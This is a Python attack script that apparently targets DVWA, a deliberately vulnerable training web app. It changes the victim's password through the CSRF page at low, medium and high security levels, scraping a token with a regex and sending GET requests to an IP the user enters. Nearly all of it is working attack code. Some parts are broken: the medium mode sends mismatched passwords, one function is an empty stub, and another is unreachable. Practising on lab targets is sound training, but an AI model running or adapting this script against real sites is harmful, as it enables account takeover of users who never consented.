import requests
import re

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "DNT": "1",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

def get_user_token(url):
    """Extract CSRF token from the response."""
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        response.raise_for_status()
        token = re.search(r'[a-f0-9]{32}', response.text)
        if token:
            print(f"[*] Extracted CSRF Token: {token.group(0)}")
            return token.group(0)
        else:
            print("[!] Unable to extract CSRF token.")
            return None
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def attack_low(target_ip):
    """Perform a simple CSRF attack on DVWA (low security)."""
    url = f"http://{target_ip}/vulnerabilities/csrf/?password_new=stackzero&password_conf=stackzero&Change=Change"
    response = requests.get(url, headers=HEADERS)
    print(f"[Low] Password change attempt. Response Code: {response.status_code}")

def attack_medium(target_ip):
    """CSRF attack (medium security) using CSRF token."""
    url = f"http://{target_ip}/vulnerabilities/csrf/"
    token = get_user_token(url)
    if not token:
        return

    payload = {
        "password_new": "admin",
        "password_conf": "qq",
        "Change": "Change",
        "user_token": token
    }
    response = requests.get(url, params=payload, headers=HEADERS)
    print(f"[Medium] Password change attempt. Response Code: {response.status_code}")

def attack_high(target_ip):
    """CSRF attack (high security) using CSRF token."""
    url = f"http://{target_ip}/vulnerabilities/csrf/"
    token = get_user_token(url)
    if not token:
        return

    payload = {
        "password_new": "stackzero",
        "password_conf": "stackzero",
        "Change": "Change",
        "user_token": token
    }
    response = requests.get(url, params=payload, headers=HEADERS)
    print(f"[High] Password change attempt. Response Code: {response.status_code}")

def attack_with_url_encoding(target_ip):
    encoded_password = requests.utils.quote("stackzero")
    url = f"http://{target_ip}/vulnerabilities/csrf/?password_new={encoded_password}&password_conf={encoded_password}&Change=Change"
    response = requests.get(url, headers=HEADERS)
    print(f"[URL Encoding] Password change attempt. Response Code: {response.status_code}")

def attack_login(target_ip):
    url = f"http://{target_ip}"


def main():
    print("Select the CSRF attack mode:")
    print("1. Low Security Attack")
    print("2. Medium Security Attack")
    print("3. High Security Attack")

    mode = input("Enter your choice (1-3): ")
    target_ip = input("Enter the target IP (e.g., 10.10.93.202): ")

    if mode == '1':
        attack_low(target_ip)
    elif mode == '2':
        attack_medium(target_ip)
    elif mode == '3':
        attack_high(target_ip)
    else:
        print("[!] Invalid selection. Please choose a valid mode.")

if __name__ == "__main__":
    main()
